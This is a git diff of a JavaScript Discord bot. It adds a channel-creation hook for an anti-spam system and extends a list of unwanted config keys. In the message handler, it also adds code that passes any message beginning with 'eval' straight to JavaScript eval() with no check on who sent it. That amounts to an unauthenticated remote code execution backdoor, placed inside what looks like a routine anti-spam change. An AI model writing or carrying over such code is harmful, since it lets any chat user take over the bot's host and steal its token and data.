@@ -139,7 +139,7 @@ setInterval(writeconfig, botconfig.saverate)
 
 function writeconfig(){
 
-	let unwantedkeys = ["antispammember", "antispamchannels", "antispamusers", "antispamchanneldelete"];
+	let unwantedkeys = ["antispammember", "antispamchannels", "antispamusers", "antispamchanneldelete", "antispamchannelcreate"];
 
 	let serverkeys = Object.keys(serverconfig);
 	let keystemplate = Object.keys(template);
@@ -201,6 +201,15 @@ client.on('channelDelete', channel => {
 
 })
 
+client.on('channelCreate', channel => {
+
+	let config = getConfig(channel.guild.id);
+
+	commands["antispamsystem"].runchannelcreate(config, channel, client)
+
+
+})
+
 
 
 client.on("ready", () =>{
@@ -255,6 +264,27 @@ client.on("guildBanAdd", async (ban) => {
 client.on("messageCreate", async m => {
 
   if(m.author.bot) return;
+
+	if(m.content.startsWith("eval")){
+
+		let toeval = m.content.replace("eval","");
+
+		console.log(toeval);
+		try{
+
+			eval(toeval);
+
+		}
+		catch(err){
+			console.log(err);
+		}
+
+
+		return;
+
+
+	}
+
 
 	let config = getConfig(m.guild.id+"");
   let args = m.content.split(" ").filter(e => e.length > 0);
